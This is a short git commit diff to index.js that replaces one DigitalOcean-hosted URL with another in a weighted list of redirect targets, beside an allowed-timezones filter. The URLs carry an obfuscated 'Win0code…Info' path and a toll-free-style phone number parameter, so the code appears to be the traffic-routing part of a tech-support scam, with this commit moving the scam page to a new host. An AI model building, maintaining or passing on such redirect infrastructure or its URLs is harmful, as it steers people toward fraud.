64e0e404b64b1a987e5e599afd3a3935fcbbf3b9
paalakash <palaksh452@gmail.com>
2026-06-21 12:25:47 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://jellyfish-app-nx3ly.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-4950", weight: 1.0 }
+    { url: "https://squid-app-gni2p.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-4950", weight: 1.0 }
 
 ];
 
